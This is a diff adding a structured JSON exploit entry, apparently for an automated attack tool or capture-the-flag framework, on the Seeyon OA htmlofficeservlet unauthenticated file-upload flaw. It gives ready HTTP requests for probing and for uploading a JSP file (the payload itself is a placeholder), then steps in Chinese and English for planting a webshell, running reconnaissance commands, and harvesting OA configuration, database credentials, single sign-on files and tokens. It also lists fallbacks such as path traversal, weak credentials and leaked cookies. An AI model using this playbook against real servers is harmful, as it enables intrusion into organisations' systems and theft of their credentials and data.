@@ -1,0 +1,120 @@
+{
+  "id": "seeyon-oa-htmlofficeservlet-file-upload",
+  "family": "oa",
+  "product": "Seeyon OA",
+  "cve": "N/A",
+  "aliases": [
+    "致远 OA htmlofficeservlet upload",
+    "Seeyon htmlofficeservlet"
+  ],
+  "severity": "critical",
+  "tags": [
+    "oa",
+    "seeyon",
+    "file-upload",
+    "jsp",
+    "foothold"
+  ],
+  "applicability": {
+    "versions": [
+      "A6",
+      "A8",
+      "A8-N",
+      "V8"
+    ],
+    "fingerprints": [
+      "Login pages, titles, or static resources mention Seeyon / 致远互联",
+      "Legacy OA deployment exposes /seeyon/ servlet namespace",
+      "/seeyon/htmlofficeservlet is reachable before authentication"
+    ],
+    "signals": [
+      "Multipart POST returns upload-success markers, file id, or a retrievable relative path",
+      "A benign uploaded text file can be fetched back from the returned location",
+      "Application server stores uploaded content under a web-accessible directory or attachment path"
+    ]
+  },
+  "preconditions": [
+    "The target is a Seeyon deployment exposing the legacy office-upload servlet.",
+    "The servlet accepts multipart traffic before or without strong authentication.",
+    "The returned upload path is reachable directly or can be linked into another application path."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/seeyon/htmlofficeservlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"FileData\"; filename=\"probe.txt\"\\r\\nContent-Type: text/plain\\r\\n\\r\\noa_probe_2026\\r\\n------ctfboundary--\\r\\n",
+        "matchers": [
+          "Response contains upload-success marker, stored filename, file id, or retrievable relative path",
+          "Returned path can be used to fetch the benign probe file"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_upload",
+    "requests": [
+      {
+        "path": "/seeyon/htmlofficeservlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"FileData\"; filename=\"audit.jsp\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n<JSP_PAYLOAD>\\r\\n------ctfboundary--\\r\\n",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认上传落点、Web 根目录映射和应用容器权限边界，再决定是否写入 JSP foothold。",
+      "命中后优先读取 OA 配置、数据库连接信息、第三方集成账号和单点登录相关文件。",
+      "如果题目是多阶段内网渗透，优先把拿到的账号、地址簿、流程附件和 token 结构化记录下来。"
+    ],
+    "shell_options": [
+      {
+        "type": "jsp_webshell_write",
+        "template": "Upload a JSP foothold through htmlofficeservlet and trigger it from the returned path"
+      },
+      {
+        "type": "cmd_echo_probe",
+        "template": "Use the foothold to run whoami && hostname && ipconfig /all"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 harmless probe 确认是否真的能落地并回读文件。",
+      "再确认返回路径是否在 Web 可达目录内，避免无意义地反复上传。",
+      "一旦获得执行能力，优先转向凭据与配置收集，而不是持续高噪声打命令。"
+    ],
+    "safe_commands": [
+      "whoami",
+      "hostname",
+      "ver",
+      "ipconfig /all"
+    ],
+    "shell_prerequisites": [
+      "Returned upload path must be reachable or linkable to a reachable Web path.",
+      "Server-side script execution must be enabled for the chosen landing directory."
+    ],
+    "fallbacks": [
+      "If uploaded files are not executable, pivot to attachment path traversal, config leakage, or admin-file import paths.",
+      "If the servlet requires partial auth, combine with weak credentials, leaked cookies, or another OA access-control issue."
+    ]
+  },
+  "detection_notes": [
+    "Seeyon environments often expose multiple legacy office integration servlets; failures on one servlet do not rule out the others.",
+    "A competition target may rely on upload-to-foothold chaining rather than direct RCE, so uploaded path verification is the key first milestone."
+  ],
+  "references": [
+    "Public Seeyon OA htmlofficeservlet upload analyses",
+    "Common Seeyon OA emergency-response writeups for legacy office-upload exposure"
+  ]
+}
